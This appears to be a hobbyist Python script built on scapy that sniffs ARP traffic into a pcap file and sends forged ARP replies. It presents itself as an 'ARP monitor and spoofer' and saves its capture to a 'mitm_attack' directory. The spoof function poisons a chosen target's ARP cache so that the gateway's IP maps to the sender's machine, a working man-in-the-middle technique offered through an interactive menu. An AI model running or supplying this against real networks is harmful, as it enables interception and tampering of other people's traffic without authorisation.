#!/usr/bin/env python3
 
from scapy.all import *
from scapy.modules import *
from scapy import *
import scapy.all as scapy



#Sniffing all broadcast packets



def arp_monitor_callback(pkt):
    pending_packets = []
    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at
        pending_packets.append(pkt)
        wrpcap('mitm_attack/arp_monitor.pcap', pending_packets, append=True)
        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")


def do_sniff(num_packets):
    sniff(prn=arp_monitor_callback, filter="arp", store=0, count=num_packets)
    print('Sniffing complete. ARP packets saved to mitm_attack/arp_monitor.pcap')




#Extracting the MAC and IP addresses from the sniffed packets
def read_bytes_from_pcap():
    packets = rdpcap('mitm_attack/arp_monitor.pcap')
    packet_dict = {}
    packet_dict = {packet[ARP].hwsrc: [packet[ARP].hwdst, packet[ARP].psrc, packet[ARP].pdst] for packet in packets}
    return packet_dict

def get_mac_of_target(target_ip, packet_dict):
    for k in packet_dict.keys():
        if packet_dict[k][1] == target_ip:
            return k
    else:
        print('Target IP not found in ARP packets. Please try again.')
        main()

def view_working_pcap():
    packets = read_bytes_from_pcap()
    for k in packets.keys():
        print(f'MAC: {k} | Src.IP: {packets[k][1]}')

def spoof(target_ip, gateway_ip):
    target_mac = get_mac_of_target(target_ip, read_bytes_from_pcap())
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=True)
    


def main():

    print('Welcome to the ARP monitor and spoofer') #lets make a better name for this lol
    user_in = input('What would you like to do? (1) Monitor ARP packets (2) Spoof ARP packets (3) View working pcap (4) Exit\n')
    if user_in != '1' and user_in != '2' and user_in != '3' and user_in != '4':
        print('Invalid input. Please try again.')
        main()
    elif user_in == '1':
        num_packets = input('how many packets would you like to sniff? ')
        print(f'Sniffing {num_packets} ARP packets...')
        do_sniff(int(num_packets))
        main()
    elif user_in == '2':
        target = input('What is the target IP? ')
        gateway = input('What is the gateway IP? ')
        print('Spoofing ARP packets...')
        spoof(target, gateway)
    elif user_in == '3':
        view_working_pcap()
    elif user_in == '4':
        print('Exiting...')
        exit()


if __name__ == '__main__':
    main()